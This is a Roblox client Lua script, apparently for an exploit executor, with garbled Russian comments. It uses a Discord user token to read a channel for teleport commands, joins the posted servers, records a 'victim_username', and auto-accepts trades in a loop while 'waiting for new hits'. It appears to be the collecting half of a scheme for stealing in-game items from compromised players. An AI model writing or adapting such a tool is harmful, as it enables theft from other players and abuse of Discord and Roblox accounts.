if not game:IsLoaded() then
    game.Loaded:Wait()
    print("‚úÖ –ò–≥—Ä–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞")
end

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –∏ ID –∫–∞–Ω–∞–ª–∞
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("‚ùå –í–≤–µ–¥–∏ —Ç–æ–∫–µ–Ω –∏ channelId!")
    return
end

-- Anti-AFK
local VirtualUser = game:GetService('VirtualUser')
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- –§—É–Ω–∫—Ü–∏—è –≤—ã–±–æ—Ä–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
local function selectDevice()
    local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
    if DeviceSelectGui then
        local button = DeviceSelectGui.Container.Phone.Button
        local centerX = button.AbsolutePosition.X + button.AbsoluteSize.X/2
        local centerY = button.AbsolutePosition.Y + button.AbsoluteSize.Y/2
        
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
        task.wait(0.1)
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        print("üì± –í—ã–±—Ä–∞–Ω–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: Phone")
    end
end

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Ñ–∞–π–ª–æ–≤
local HttpService = game:GetService("HttpService")
if not isfile("user.txt") then writefile("user.txt", "victim_username") end
if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end

local victimUser = readfile("user.txt")
local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
local isTeleporting = false

-- –£–ª—É—á—à–µ–Ω–Ω—ã–π –ø–∞—Ä—Å–µ—Ä –∫–æ–º–∞–Ω–¥—ã —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏
local function findTeleportCommand(content)
    if not content then return nil, nil end
    
    -- –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –ø–∞—Ç—Ç–µ—Ä–Ω –¥–ª—è –ª—é–±—ã—Ö –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤
    local patterns = {
        'TeleportService["\'%)]%s*:%s*TeleportToPlacelnstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
        'game%s*[:%.]%s*GetService%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*TeleportToPlacelnstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
        'TeleportService["\'%)]%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
    }
    
    for _, pattern in ipairs(patterns) do
        local placeId, jobId = content:match(pattern)
        if placeId and jobId then
            return placeId, jobId
        end
    end
    
    return nil, nil
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Discord
local function checkDiscord()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['Content-Type'] = 'application/json'
        }
    })

    if not response.Success then
        warn("‚ùå –û—à–∏–±–∫–∞ Discord:", response.StatusCode)
        return
    end

    local messages = HttpService:JSONDecode(response.Body)
    for _, msg in ipairs(messages) do
        if msg.content then
            print("üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ:", string.sub(msg.content, 1, 100))
            
            local placeId, jobId = findTeleportCommand(msg.content)
            if placeId and jobId then
                print("üéØ –ù–∞–π–¥–µ–Ω—ã ID:", placeId, jobId)
                
                if not table.find(joinedIds, msg.id) then
                    table.insert(joinedIds, msg.id)
                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                    
                    print("üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç–∏—Ä—É–µ–º—Å—è...")
                    isTeleporting = true
                    local success = pcall(function()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
                    end)
                    
                    if not success then
                        isTeleporting = false
                        warn("‚ùå –û—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏")
                    end
                    return
                else
                    print("‚ö†Ô∏è –£–∂–µ –±—ã–ª–∏ –Ω–∞ —ç—Ç–æ–º —Å–µ—Ä–≤–µ—Ä–µ")
                end
            end
        end
    end
end

-- –ê–≤—Ç–æ–ø—Ä–∏–Ω—è—Ç–∏–µ —Ç—Ä–µ–π–¥–æ–≤
local function autoAcceptTrade()
    while task.wait(1) do
        pcall(function()
            game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
        end)
    end
end

-- –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ —á–∞—Ç
local function sendChatMessage()
    task.wait(3) -- –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏
    pcall(function()
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("hi")
        print("üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ 'hi' –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ —á–∞—Ç")
    end)
end

-- –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
task.spawn(selectDevice)
task.spawn(sendChatMessage)
task.spawn(autoAcceptTrade)

print("‚ú® –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω! –û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö —Ö–∏—Ç–æ–≤...")
while task.wait(5) do
    if not isTeleporting then
        pcall(checkDiscord)
    end
end
